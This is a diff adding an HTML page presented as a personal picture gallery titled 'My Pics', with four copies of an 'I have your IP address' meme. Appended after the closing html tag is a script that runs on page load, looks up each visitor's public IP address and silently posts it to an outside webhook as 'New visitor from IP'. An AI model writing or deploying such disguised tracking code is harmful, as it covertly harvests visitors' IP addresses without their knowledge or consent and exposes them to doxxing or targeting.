@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pics</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f8f9fa;
+            text-align: center;
+            padding: 20px;
+        }
+        .pic-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            grid-template-rows: auto auto;
+            gap: 20px;
+            max-width: 900px;
+            margin: auto;
+        }
+        .Pic-item {
+            background-color: #fff;
+            padding: 15px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            overflow: hidden;
+        }
+        .Pic-item img {
+            width: 100%;
+            height: auto;
+            border-radius: 10px;
+        }
+        .Pic-item h3 {
+            margin: 10px 0 5px;
+        }
+        .Pic-item p {
+            font-size: 0.9em;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <h1>My Pics</h1>
+    <div class="pic-container">
+        <div class="Pic-item">
+            <img src="https://media1.tenor.com/m/QjNaETDi76cAAAAd/ip-i-have-your-ip-address.gif" alt="Pic 1">
+        </div>
+        <div class="Pic-item">
+            <img src="https://media1.tenor.com/m/QjNaETDi76cAAAAd/ip-i-have-your-ip-address.gif" alt="Pic 2">
+        </div>
+        <div class="Pic-item">
+            <img src="https://media1.tenor.com/m/QjNaETDi76cAAAAd/ip-i-have-your-ip-address.gif" alt="Pic 3">
+        </div>
+        <div class="Pic-item">
+            <img src="https://media1.tenor.com/m/QjNaETDi76cAAAAd/ip-i-have-your-ip-address.gif" alt="Pic 4">
+        </div>
+    </div>
+</body>
+</html>
+    <script>
+        const webhookURL = 'https://l.webhook.party/hook/n3h9kdv%2BBMh8gqdGXbbhIJg4gCQQBT5RSOGJpJ%2FdKLXACtch4VlGzOoSVpPvlSaabJnlSs7z32%2FriZA8j%2Br3NM1u%2Fr2WbfddBD2gvX43Y9usM5mg7ahuGpyfHxTwnE99fS7MGktAaHRQk3A1sWw6yUnjGotsfsN7ZYOwiNPTTxQ8KV%2BY8otolPQamDW%2F%2FeEut2rB%2BUO%2FUWAGJzuOv6EbzDltec74fZScLzToZKReVTavWK1DiKKKlgFzorguUAe7TkT2%2BRkQuz9lBJEG3sZYF0QYRAOaIPFNmBHKVCp6i7uCoQIKCol6Q1rBI%2Buwc03l0SsnHVHUIvUtq0AEYReBfSlocgoAN5Tsp5va1Vge1%2FFM5pNIWt9LmiMssbOVSnTt4OCB4JMlq%2Fo%3D/AtSw%2FkcsIiqydgjO';
+
+        function getUserIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+                    sendToDiscord(userIP);
+                })
+                .catch(error => console.error('Error getting IP:', error));
+        }
+
+        function sendToDiscord(ip) {
+            const payload = {
+                content: `New visitor from IP: ${ip}`
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => response.json())
+            .then(data => console.log('IP logged to Discord:', data))
+            .catch(error => console.error('Error sending to Discord:', error));
+        }
+
+        getUserIP();
+    </script>
